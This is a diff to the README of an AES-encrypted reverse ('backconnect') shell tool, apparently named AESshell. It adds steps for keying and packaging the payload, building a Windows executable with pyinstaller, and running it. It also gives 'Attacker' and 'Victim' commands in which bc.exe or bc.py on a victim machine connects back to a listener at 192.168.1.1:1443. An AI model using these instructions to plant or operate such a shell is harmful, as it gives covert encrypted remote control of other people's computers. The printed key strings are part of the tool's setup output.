@@ -13,33 +13,53 @@ Bright side
 - tries 10 times to connect back, quits afterwards
 - windows binary provided
 
+Preperation
+-----------
+Create a new package:
+$ ./prepare.py 
+[*] Copy bc.py to aesout/bc.py
+[*] Copy listen.py to aesout/listen.py
+[*] Copy aes.py to aesout/aes.py
+[*] Copy bc.spec to aesout/bc.spec
+[*] Copy MSVCP90.dll to aesout/MSVCP90.dll
+[*] Copy MSVCR90.dll to aesout/MSVCR90.dll
+[*] Copy done
+[*] New Key: aQlfNwMbxcS7vH4lEShQgDdJ2GOL9NBjwOecrUGcLj++M2C4CrV9poQJ+0Bi3MdzqRCMCqMTCbI=
+[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
+[*] aesout/bc.py ready
+[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
+[*] aesout/listen.py ready
+[*] Done
+
+Build Exe:
+
+C:\pyinstaller -F bc.spec
+
+Test it:
+C:\dist\bc.exe
+
 Usage
 -----
-Change crypto key in both files:
-$ python2 -c 'import aes;aye = aes.Crypticle.generate_key_string();print "Set new key: ", aye'
-Open up the files and replace the key.
 
 Attacker:
-$ ./listen.py 0.0.0.0 1443
+$ python listen.py 0.0.0.0 1443
 
-Victim:
+Victim MS-Windows:
 C:\bc.exe 192.168.1.1 1443
+
+Victim *nix with python interpreter:
+$ python bc.py 192.168.1.1 1443
 
 Files
 -----
-bc.py - the backconnect shell
-bc.exe - compiled with pyinstaller for windows (Tested: WinXP/Win7)
-listen.py - the listener shell
-aes.py - crypto import
+aes.py 		- crypto import, needed by listen.py (integrated into bc.py)
+bc.exe 		- compiled with pyinstaller for windows (Tested: WinXP/Win7/Win8)
+bc.spec 	- spec file for pyinstaller
+bc.py 		- the backconnect shell
+listen.py 	- the listener shell
+prepare.py	- prepares all *.py files with a new aes key and outputs it to aesout
+MSV*		- windows dlls for pyinstaller
 
-WARNING
--------
-Warning! AESshell will *NOT* spawn a fully featured shell on windows!
-While with unix the old filedescriptor and fork trick works, it seems to be 
-more complicated getting it done under windows using python.
-
-That said, DO NOT try to execute cmd.exe or alike if you backconnect from a
-windows system - your pseudo shell will hang.
 
 Author
 ------
